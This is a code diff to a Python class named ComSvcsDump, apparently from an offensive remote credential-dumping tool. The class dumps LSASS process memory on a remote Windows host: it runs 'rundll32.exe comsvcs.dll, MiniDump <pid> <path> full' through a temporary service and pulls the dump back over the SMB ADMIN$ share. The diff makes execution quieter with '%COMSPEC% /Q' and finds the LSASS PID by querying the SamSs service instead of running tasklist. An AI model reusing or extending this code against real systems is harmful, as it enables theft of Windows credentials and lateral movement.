@@ -55,9 +55,8 @@ class ComSvcsDump(DumpMethod):
             lsass_pid = self._find_lsass_pid(svc_name)
 
         # Build the command line
-        # Use cmd /c to handle the comma properly in the argument
         cmd = (
-            f"cmd.exe /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
+            f"%COMSPEC% /Q /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
             f"MiniDump {lsass_pid} {dump_path} full"
         )
 
@@ -65,7 +64,7 @@ class ComSvcsDump(DumpMethod):
         self._exec_via_service(svc_name, cmd)
 
         # Wait for the dump to be written
-        time.sleep(2)
+        time.sleep(5)
 
         # Retrieve the dump via SMB (ADMIN$ maps to C:\Windows)
         try:
@@ -85,28 +84,15 @@ class ComSvcsDump(DumpMethod):
         return dump_data
 
     def _find_lsass_pid(self, svc_name: str) -> int:
-        """Find lsass.exe PID using tasklist output written to a file."""
-        out_name = f"{random_name()}.tmp"
-        out_path_smb = f"Temp\\{out_name}"
-
-        cmd = f'cmd.exe /c tasklist /FI "IMAGENAME eq lsass.exe" /FO CSV /NH > C:\\Windows\\Temp\\{out_name}'
-        self._exec_via_service(svc_name + "f", cmd)
-        time.sleep(1)
-
-        try:
-            data = self.session.read_file("ADMIN$", out_path_smb)
-            # Parse CSV: "lsass.exe","PID","Services","0","memory K"
-            text = data.decode("utf-8", errors="ignore").strip()
-            for line in text.splitlines():
-                parts = line.strip('"').split('","')
-                if len(parts) >= 2 and "lsass" in parts[0].lower():
-                    return int(parts[1].strip('"'))
-            raise RuntimeError(f"Could not find lsass.exe PID in: {text}")
-        finally:
-            try:
-                self.session.delete_file("ADMIN$", out_path_smb)
-            except Exception:
-                pass
+        """Find lsass.exe PID by querying the SamSs service (which runs in lsass.exe)."""
+        with self.session.open_pipe("svcctl") as pipe:
+            svc = SvcCtl(pipe)
+            svc.bind()
+            svc.open_sc_manager()
+            svc_handle = svc.open_service("SamSs")
+            pid = svc.query_service_pid(svc_handle)
+            svc.close_handle(svc_handle)
+            return pid
 
     def _exec_via_service(self, svc_name: str, cmd: str) -> None:
         """Execute a command by creating and starting a temporary service."""
